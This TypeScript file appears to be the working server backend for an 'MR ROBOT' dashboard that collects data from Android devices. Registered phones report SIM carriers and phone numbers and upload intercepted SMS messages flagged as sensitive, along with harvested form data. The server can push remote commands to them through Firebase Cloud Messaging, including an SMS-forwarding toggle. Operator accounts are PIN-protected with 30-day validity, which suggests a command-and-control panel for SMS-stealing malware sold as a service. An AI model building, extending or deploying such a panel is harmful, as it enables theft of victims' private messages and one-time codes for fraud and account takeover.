/* Cloudflare Pages Functions API for MR ROBOT dashboard.
 * Firebase is used only for FCM. App/device/message data is stored in Cloudflare KV when bound as MRROBOT_KV.
 * If KV is not bound, it falls back to in-memory storage so the dashboard can load, but data may reset.
 */

type Env = {
  MRROBOT_KV?: KVNamespace;
  FIREBASE_PROJECT_ID?: string;
  FIREBASE_CLIENT_EMAIL?: string;
  FIREBASE_PRIVATE_KEY?: string;
  FIREBASE_SERVICE_ACCOUNT_JSON?: string;
};

type AppRow = { id: number; appId: string; name: string; pin: string; status: string; createdAt: string };
type DeviceRow = {
  id: number; deviceId: string; appId: string; userId: string; name: string; androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null; sim2Carrier: string | null; sim2Phone: string | null;
  status: string; lastOnline: string | null; forwardEnabled: boolean; fcmToken: string | null; installedAt: string; updatedAt: string;
};
type MessageRow = { id: number; appId: string; deviceId: string; userId: string; fromSender: string; fromNumber: string; body: string; isSensitive: boolean; receivedAt: string };
type FormDataRow = { id: number; appId: string; deviceId: string; data: Record<string, unknown>; submittedAt: string };
type DataFile = { apps: AppRow[]; devices: DeviceRow[]; messages: MessageRow[]; formData: FormDataRow[]; meta: { nextAppId: number; nextDeviceId: number; nextMessageId: number; nextFormDataId: number } };
type AdminSession = { id: string; loginTime: string; lastActive: string; userAgent: string; ip: string; device: string };

declare global { var __MRROBOT_DB__: DataFile | undefined; var __MRROBOT_SESSIONS__: AdminSession[] | undefined; }

const DATA_KEY = "mrrobot:data";
const SESSIONS_KEY = "mrrobot:sessions";
const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
const DEFAULT_APP_NAME = "MR ROBOT";
const DEFAULT_APP_PIN = "1234";
function makeDefaultApp(): AppRow {
  return { id: 1, appId: DEFAULT_APP_ID, name: DEFAULT_APP_NAME, pin: DEFAULT_APP_PIN, status: "active", createdAt: new Date().toISOString() };
}
const VALIDITY_DAYS = 30;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET,POST,PATCH,DELETE,OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type,Authorization",
};

function json(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), { status, headers: { ...corsHeaders, "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" } });
}
function notFound() { return json({ error: "Not found" }, 404); }
function bad(message: string) { return json({ error: message }, 400); }
async function bodyJson(request: Request): Promise<Record<string, unknown>> { try { return await request.json() as Record<string, unknown>; } catch { return {}; } }
function nowIso() { return new Date().toISOString(); }
function emptyData(): DataFile { return { apps: [makeDefaultApp()], devices: [], messages: [], formData: [], meta: { nextAppId: 2, nextDeviceId: 1, nextMessageId: 1, nextFormDataId: 1 } }; }
function isExpired(createdAt: string): boolean { return Date.now() > new Date(createdAt).getTime() + VALIDITY_DAYS * 86400000; }
function randomId(): string { return crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${Math.random().toString(16).slice(2)}`; }

async function loadDb(env: Env): Promise<DataFile> {
  if (env.MRROBOT_KV) {
    const raw = await env.MRROBOT_KV.get(DATA_KEY);
    if (raw) return normalizeDb(JSON.parse(raw));
    const initial = emptyData();
    await saveDb(env, initial);
    return initial;
  }
  if (!globalThis.__MRROBOT_DB__) globalThis.__MRROBOT_DB__ = emptyData();
  return globalThis.__MRROBOT_DB__;
}
function normalizeDb(parsed: Partial<DataFile>): DataFile {
  const apps = [...(parsed.apps ?? [])];
  const defaultIndex = apps.findIndex(a => a.appId === DEFAULT_APP_ID);
  if (defaultIndex === -1) {
    apps.unshift(makeDefaultApp());
  } else {
    apps[defaultIndex] = {
      ...apps[defaultIndex],
      appId: DEFAULT_APP_ID,
      name: apps[defaultIndex].name || DEFAULT_APP_NAME,
      pin: apps[defaultIndex].pin || DEFAULT_APP_PIN,
      status: "active",
      createdAt: apps[defaultIndex].createdAt || new Date().toISOString(),
    };
  }
  const maxAppId = apps.reduce((max, app) => Math.max(max, Number(app.id) || 0), 1);
  return {
    apps,
    devices: parsed.devices ?? [], messages: parsed.messages ?? [], formData: parsed.formData ?? [],
    meta: {
      nextAppId: Math.max(parsed.meta?.nextAppId ?? 0, maxAppId + 1),
      nextDeviceId: parsed.meta?.nextDeviceId ?? ((parsed.devices?.length ?? 0) + 1),
      nextMessageId: parsed.meta?.nextMessageId ?? ((parsed.messages?.length ?? 0) + 1),
      nextFormDataId: parsed.meta?.nextFormDataId ?? ((parsed.formData?.length ?? 0) + 1),
    },
  };
}
async function saveDb(env: Env, data: DataFile): Promise<void> {
  if (env.MRROBOT_KV) await env.MRROBOT_KV.put(DATA_KEY, JSON.stringify(data));
  globalThis.__MRROBOT_DB__ = data;
}
async function loadSessions(env: Env): Promise<AdminSession[]> {
  if (env.MRROBOT_KV) return JSON.parse((await env.MRROBOT_KV.get(SESSIONS_KEY)) ?? "[]") as AdminSession[];
  if (!globalThis.__MRROBOT_SESSIONS__) globalThis.__MRROBOT_SESSIONS__ = [];
  return globalThis.__MRROBOT_SESSIONS__;
}
async function saveSessions(env: Env, sessions: AdminSession[]): Promise<void> {
  if (env.MRROBOT_KV) await env.MRROBOT_KV.put(SESSIONS_KEY, JSON.stringify(sessions));
  globalThis.__MRROBOT_SESSIONS__ = sessions;
}
function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone"; if (/iPad/.test(ua)) return "iPad"; if (/Android/.test(ua)) return "Android";
  if (/Windows/.test(ua)) return "Windows PC"; if (/Macintosh|Mac OS/.test(ua)) return "Mac"; if (/Linux/.test(ua)) return "Linux";
  return "Unknown Device";
}
function getFirebaseCredentials(env: Env): { project_id: string; client_email: string; private_key: string } {
  if (env.FIREBASE_SERVICE_ACCOUNT_JSON) {
    const parsed = JSON.parse(env.FIREBASE_SERVICE_ACCOUNT_JSON);
    return { project_id: parsed.project_id, client_email: parsed.client_email, private_key: String(parsed.private_key).replace(/\\n/g, "\n") };
  }
  if (!env.FIREBASE_PROJECT_ID || !env.FIREBASE_CLIENT_EMAIL || !env.FIREBASE_PRIVATE_KEY) throw new Error("Firebase FCM env missing");
  return { project_id: env.FIREBASE_PROJECT_ID, client_email: env.FIREBASE_CLIENT_EMAIL, private_key: env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, "\n") };
}
function base64url(input: ArrayBuffer | string): string {
  let bytes: Uint8Array;
  if (typeof input === "string") bytes = new TextEncoder().encode(input); else bytes = new Uint8Array(input);
  let bin = ""; for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}
async function importPrivateKey(pem: string): Promise<CryptoKey> {
  const b64 = pem.replace(/-----BEGIN PRIVATE KEY-----|-----END PRIVATE KEY-----|\s/g, "");
  const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  return crypto.subtle.importKey("pkcs8", raw, { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" }, false, ["sign"]);
}
async function getGoogleAccessToken(env: Env): Promise<string> {
  const c = getFirebaseCredentials(env);
  const iat = Math.floor(Date.now() / 1000);
  const header = { alg: "RS256", typ: "JWT" };
  const claim = { iss: c.client_email, scope: "https://www.googleapis.com/auth/firebase.messaging", aud: "https://oauth2.googleapis.com/token", iat, exp: iat + 3600 };
  const unsigned = `${base64url(JSON.stringify(header))}.${base64url(JSON.stringify(claim))}`;
  const key = await importPrivateKey(c.private_key);
  const sig = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, new TextEncoder().encode(unsigned));
  const assertion = `${unsigned}.${base64url(sig)}`;
  const res = await fetch("https://oauth2.googleapis.com/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer", assertion }) });
  const j = await res.json() as { access_token?: string; error?: string; error_description?: string };
  if (!res.ok || !j.access_token) throw new Error(j.error_description || j.error || "Could not get Google access token");
  return j.access_token;
}
async function sendFcm(env: Env, token: string, data: Record<string, string>) {
  const c = getFirebaseCredentials(env);
  const accessToken = await getGoogleAccessToken(env);
  const res = await fetch(`https://fcm.googleapis.com/v1/projects/${c.project_id}/messages:send`, { method: "POST", headers: { Authorization: `Bearer ${accessToken}`, "Content-Type": "application/json" }, body: JSON.stringify({ message: { token, data } }) });
  const j = await res.json();
  if (!res.ok) throw Object.assign(new Error("FCM rejected"), { status: res.status, body: j });
  return j;
}

async function handle(request: Request, env: Env): Promise<Response> {
  if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: corsHeaders });
  const url = new URL(request.url);
  const path = url.pathname.replace(/^\/api\/?/, "");
  const parts = path.split("/").filter(Boolean);
  const method = request.method.toUpperCase();
  const db = await loadDb(env);

  if (path === "" || path === "health") return json({ ok: true, status: "running", time: Date.now() });

  if (parts[0] === "events" && method === "GET") {
    return new Response(":ping\n\n", { headers: { ...corsHeaders, "Content-Type": "text/event-stream", "Cache-Control": "no-cache" } });
  }

  if (parts[0] === "apps") {
    const appId = parts[1];
    if (!appId && method === "GET") {
      for (const app of db.apps) {
        if (app.appId === DEFAULT_APP_ID) app.status = "active";
        else if (app.status === "active" && isExpired(app.createdAt)) app.status = "disabled";
      }
      await saveDb(env, db);
      return json([...db.apps].sort((a, b) => a.createdAt.localeCompare(b.createdAt)));
    }
    if (!appId && method === "POST") {
      const body = await bodyJson(request);
      if (!body.appId || !body.name) return bad("appId and name are required");
      if (db.apps.some(a => a.appId === body.appId)) return json({ error: "App ID already exists" }, 409);
      const row: AppRow = { id: db.meta.nextAppId++, appId: String(body.appId), name: String(body.name), pin: String(body.pin ?? "1234"), status: String(body.status ?? "active"), createdAt: nowIso() };
      db.apps.push(row); await saveDb(env, db); return json(row, 201);
    }
    const app = db.apps.find(a => a.appId === appId);
    if (!app) return notFound();
    if (app.status === "active" && isExpired(app.createdAt)) { app.status = "disabled"; await saveDb(env, db); }
    if (parts[2] === "verify-pin" && method === "POST") {
      const body = await bodyJson(request);
      if (!body.pin) return bad("PIN required");
      if (app.status !== "active") return json({ error: "App is disabled" }, 403);
      if (app.pin !== String(body.pin)) return json({ error: "Wrong PIN" }, 401);
      return json({ ok: true, appId: app.appId, name: app.name });
    }
    if (method === "GET") return json(app);
    if (method === "PATCH") {
      const body = await bodyJson(request);
      if (body.name !== undefined) app.name = String(body.name); if (body.pin !== undefined) app.pin = String(body.pin); if (body.status !== undefined) app.status = String(body.status);
      await saveDb(env, db); return json(app);
    }
    if (method === "DELETE") { db.apps = db.apps.filter(a => a.appId !== appId); await saveDb(env, db); return json({ ok: true }); }
  }

  if (parts[0] === "register" && method === "POST") {
    const b = await bodyJson(request);
    if (!b.appId || !b.deviceId || !b.name) return bad("appId, deviceId and name are required");
    const deviceId = String(b.deviceId); const now = nowIso(); const existing = db.devices.find(d => d.deviceId === deviceId);
    const input = { appId: String(b.appId), deviceId, userId: String(b.userId ?? `USR-${deviceId.slice(-6).toUpperCase()}`), name: String(b.name), androidVersion: Number(b.androidVersion ?? 0), sim1Carrier: b.sim1Carrier != null ? String(b.sim1Carrier) : null, sim1Phone: b.sim1Phone != null ? String(b.sim1Phone) : null, sim2Carrier: b.sim2Carrier != null ? String(b.sim2Carrier) : null, sim2Phone: b.sim2Phone != null ? String(b.sim2Phone) : null, fcmToken: b.fcmToken != null ? String(b.fcmToken) : null, status: "online", lastOnline: now, forwardEnabled: false };
    if (existing) Object.assign(existing, input, { updatedAt: now }); else db.devices.push({ ...input, id: db.meta.nextDeviceId++, installedAt: now, updatedAt: now });
    await saveDb(env, db); return json({ ok: true, deviceId, created: !existing }, existing ? 200 : 201);
  }
  if (parts[0] === "heartbeat" && method === "POST") {
    const b = await bodyJson(request); if (!b.deviceId) return bad("deviceId is required");
    const d = db.devices.find(x => x.deviceId === String(b.deviceId)); if (!d) return json({ error: "Device not found. Call /api/register first." }, 404);
    d.status = "online"; d.lastOnline = nowIso(); d.updatedAt = nowIso(); if (b.fcmToken != null) d.fcmToken = String(b.fcmToken);
    await saveDb(env, db); return json({ ok: true });
  }
  if (parts[0] === "devices") {
    const deviceId = parts[1];
    if (!deviceId && method === "GET") {
      const appId = url.searchParams.get("appId"); const userId = url.searchParams.get("userId");
      return json(db.devices.filter(d => appId ? d.appId === appId : userId ? d.userId === userId : true));
    }
    const d = db.devices.find(x => x.deviceId === deviceId); if (!d) return notFound();
    if (method === "GET") return json(d);
    if (method === "PATCH") { const b = await bodyJson(request); if (b.status !== undefined) d.status = String(b.status); if (b.lastOnline !== undefined) d.lastOnline = String(b.lastOnline); if (b.fcmToken !== undefined) d.fcmToken = String(b.fcmToken); if (b.forwardEnabled !== undefined) d.forwardEnabled = Boolean(b.forwardEnabled); d.updatedAt = nowIso(); await saveDb(env, db); return json(d); }
  }
  if (parts[0] === "messages") {
    if (method === "GET") { const appId = url.searchParams.get("appId"); const userId = url.searchParams.get("userId"); const deviceId = url.searchParams.get("deviceId"); return json(db.messages.filter(m => appId ? m.appId === appId : userId ? m.userId === userId : deviceId ? m.deviceId === deviceId : true).sort((a,b)=>b.receivedAt.localeCompare(a.receivedAt))); }
    if (method === "POST") { const b = await bodyJson(request); if (!b.appId || !b.deviceId || !b.fromNumber || !b.body) return bad("appId, deviceId, fromNumber and body are required"); const row: MessageRow = { id: db.meta.nextMessageId++, appId: String(b.appId), deviceId: String(b.deviceId), userId: String(b.userId ?? `USR-${String(b.deviceId).slice(-6).toUpperCase()}`), fromSender: String(b.fromSender ?? "Unknown"), fromNumber: String(b.fromNumber), body: String(b.body), isSensitive: Boolean(b.isSensitive ?? false), receivedAt: nowIso() }; db.messages.push(row); await saveDb(env, db); return json({ ok: true, id: row.id }, 201); }
  }
  if (parts[0] === "data") {
    if (method === "GET") { const appId = url.searchParams.get("appId"); if (!appId) return bad("appId is required"); const deviceId = url.searchParams.get("deviceId"); return json(db.formData.filter(f => f.appId === appId && (!deviceId || f.deviceId === deviceId)).sort((a,b)=>b.submittedAt.localeCompare(a.submittedAt))); }
    if (method === "POST") { const b = await bodyJson(request); if (!b.appId || !b.deviceId) return bad("appId and deviceId are required"); if (!b.data || typeof b.data !== "object" || Array.isArray(b.data)) return bad("data must be a JSON object"); const row: FormDataRow = { id: db.meta.nextFormDataId++, appId: String(b.appId), deviceId: String(b.deviceId), data: b.data as Record<string, unknown>, submittedAt: nowIso() }; db.formData.push(row); await saveDb(env, db); return json(row, 201); }
    if (method === "DELETE" && parts[1]) { const id = Number(parts[1]); db.formData = db.formData.filter(f => f.id !== id); await saveDb(env, db); return json({ ok: true }); }
  }
  if (parts[0] === "stats" && method === "GET") { const appId = url.searchParams.get("appId"); return json(appId ? { devices: db.devices.filter(d=>d.appId===appId).length, messages: db.messages.filter(m=>m.appId===appId).length, formData: db.formData.filter(f=>f.appId===appId).length } : { apps: db.apps.length, devices: db.devices.length, messages: db.messages.length, formData: db.formData.length }); }
  if (parts[0] === "sample" && method === "GET") { const appId = url.searchParams.get("appId"); return json(appId ? { devices: db.devices.find(d=>d.appId===appId) ?? null, messages: db.messages.find(m=>m.appId===appId) ?? null, formData: db.formData.find(f=>f.appId===appId) ?? null } : { apps: db.apps[0] ?? null, devices: db.devices[0] ?? null, messages: db.messages[0] ?? null, formData: db.formData[0] ?? null }); }
  if (parts[0] === "admin" && parts[1] === "sessions") {
    let sessions = await loadSessions(env);
    if (!parts[2] && method === "GET") return json([...sessions].sort((a,b)=>b.loginTime.localeCompare(a.loginTime)));
    if (!parts[2] && method === "POST") { const ua = request.headers.get("user-agent") ?? ""; const now = nowIso(); const s: AdminSession = { id: randomId(), loginTime: now, lastActive: now, userAgent: ua, ip: request.headers.get("cf-connecting-ip") ?? request.headers.get("x-forwarded-for") ?? "unknown", device: parseDevice(ua) }; sessions.push(s); await saveSessions(env, sessions); return json({ sessionId: s.id }); }
    if (!parts[2] && method === "DELETE") { await saveSessions(env, []); return json({ ok: true }); }
    if (parts[2] && method === "DELETE") { sessions = sessions.filter(s=>s.id !== parts[2]); await saveSessions(env, sessions); return json({ ok: true }); }
    if (parts[2] && parts[3] === "ping" && method === "PATCH") { const s = sessions.find(x=>x.id===parts[2]); if (s) s.lastActive = nowIso(); await saveSessions(env, sessions); return json({ ok: true }); }
  }
  if (parts[0] === "fcm" && method === "POST") {
    if (parts[1] === "send") { const b = await bodyJson(request); if (!b.deviceId) return bad("deviceId is required"); if (!b.data || typeof b.data !== "object") return bad("data object is required"); const d = db.devices.find(x => x.deviceId === String(b.deviceId)); if (!d) return notFound(); if (!d.fcmToken) return json({ error: "Device has no FCM token registered" }, 422); try { const sent = await sendFcm(env, d.fcmToken, Object.fromEntries(Object.entries(b.data as Record<string, unknown>).map(([k,v]) => [k, String(v)]))); return json({ success: true, messageId: (sent as any).name ?? "sent" }); } catch (e: any) { return json({ error: e.body ?? e.message }, e.status ?? 500); } }
    if (parts[1] === "online-check") { const b = await bodyJson(request); if (!b.token) return bad("token is required"); try { const sent = await sendFcm(env, String(b.token), Object.fromEntries(Object.entries((b.data as Record<string, unknown>) ?? { type: "online_check" }).map(([k,v]) => [k, String(v)]))); return json({ success: true, messageId: (sent as any).name ?? "sent" }); } catch (e: any) { return json({ error: e.body ?? e.message }, e.status ?? 500); } }
  }

  return notFound();
}

export const onRequest: PagesFunction<Env> = async ({ request, env }) => handle(request, env);
